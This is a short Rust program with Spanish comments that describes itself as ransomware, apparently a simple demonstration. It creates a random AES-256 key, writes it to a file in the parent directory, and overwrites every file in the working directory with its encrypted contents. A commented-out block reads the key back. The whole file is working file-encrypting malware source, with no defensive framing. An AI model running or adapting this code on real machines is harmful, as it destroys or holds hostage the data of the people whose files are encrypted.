use aesstream::AesWriter;
use crypto::aessafe::AesSafe256Encryptor;
use rand::{thread_rng, Rng};
use std::fs::{read, read_dir, File, OpenOptions};
use std::io::Write;
use std::path::Path;

fn main() {
    let key = genera_clave_cifrado();
    let cifrar_aes = AesSafe256Encryptor::new(&key);

    for archivo in read_dir("./").unwrap() {
        let archivo = archivo.unwrap().path();
        cifrar_archivos(&archivo, cifrar_aes);
    }
}

fn genera_clave_cifrado() -> [u8; 32] {
    let mut clave_file =
        File::create("../clave.key").expect("No se pudo crear el archivo, revise permisos");
    // Creamos un archivo para almacenar la clave de cifrado
    let clave: [u8; 32] = thread_rng().gen();
    // Generamos un vector de tamaño 32, que contiene 32 campos
    // con un valor u8 cada uno
    clave_file
        .write_all(&clave)
        .expect("No se pudo escribir la clave en el archivo, revise permisos");
    // Almacenamos el archivo con la clave cifrada en el directorio superior
    // del que se ejecuta el ransomware

    /*
    let mut archivo = fs::File::open("../clave.key").expect("No se puede leer el archivo");
    let mut contenido: Vec<u8> = Vec::<u8>::new();
    archivo.read_to_end(&mut contenido).unwrap();
    println!("{:?}", contenido);
    */
    // Bloque para recuperación de clave en el archivo clave.key
    return clave;
}

fn cifrar_archivos(path: &Path, cifrar_aes: AesSafe256Encryptor) -> () {
    if let Ok(file) = OpenOptions::new().write(true).open(path) {
        // Comprobar que el archivo se puede abrir como escritura
        if let Ok(content) = read(path) {
            //leemos el contenido hasta el final
            if let Ok(mut writer) = AesWriter::new(file, cifrar_aes) {
                let _ = writer.write_all(&content);
            }
        }
    }
}
